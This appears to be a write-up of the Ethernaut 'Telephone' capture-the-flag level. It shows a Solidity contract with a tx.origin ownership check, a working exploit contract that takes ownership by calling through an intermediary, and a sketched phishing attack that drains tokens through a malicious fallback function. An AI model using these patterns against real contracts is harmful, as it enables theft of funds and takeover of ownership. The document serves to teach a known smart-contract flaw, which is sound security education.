# Telephone

Claim ownership of the contract below to complete this level.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## Solution

```
contract TelephoneHack {

  address public owner;
  address public contractAddress;

  constructor() {
    contractAddress = 0x4DEef92Da627A5100DfE65C495D8b0B592700737;
  }


  function callChangeOwner(address _ownerAddress) public returns(bool){
      (bool success, bytes memory returnData) = contractAddress.call(abi.encodeWithSignature("changeOwner(address)", _ownerAddress));
   if (success) {
        return true;
    } else {
        return false;
    }
  }
}
```

### Hint from Ethernaut

While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.

An example of a possible attack is outlined below.

  1. Use tx.origin to determine whose tokens to transfer, e.g.
```
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```
  2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
```
function () payable {
  token.transfer(attackerAddress, 10000);
}
```
3. In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.